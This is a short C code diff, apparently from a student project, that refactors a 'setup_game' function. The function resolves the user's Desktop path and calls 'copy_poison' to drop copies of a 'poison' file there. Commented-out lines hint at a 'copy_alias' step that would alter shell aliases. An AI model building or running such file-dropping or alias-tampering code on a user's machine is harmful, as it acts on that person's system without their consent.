@@ -40,17 +40,23 @@ int	setup_game(int file_count, char **envp)
 {
 	DIR		*desktop_dir;
 	char	home_buffer[PATH_MAX];
+	char	*desktop_path;
 	// char	*cp_command[] = {"cp", "poison", "./tmp", NULL};
 
 	if (!(desktop_dir = opendir(getenv("HOME"))))
-		return (dprintf(2, "Could not access to Desktop\n"), 1);
-	printf("%s\n", ft_strjoin(realpath(getenv("HOME"), home_buffer), "/Desktop"));
-	if (copy_poison(file_count, home_buffer, envp))
+		return (dprintf(2, "Could not access to User\n"), 1);
+
+	desktop_path = ft_strjoin(realpath(getenv("HOME"), home_buffer), "/Desktop");
+	if (!desktop_path)
+		return (dprintf(2, "Cannot get Desktop paht\n"), 1);
+	printf("%s\n", desktop_path);
+	if (copy_poison(file_count, desktop_path, envp))
 		return (1);
 	// if (copy_poison(file_count, "./tmp", envp))
 	// 	return (dprintf(2, "Pas bon!\n"), 1);
 	// if (copy_alias(file_count, envp))
 	// 	return (1);
+	free(desktop_path);
 	return (0);
 }
 
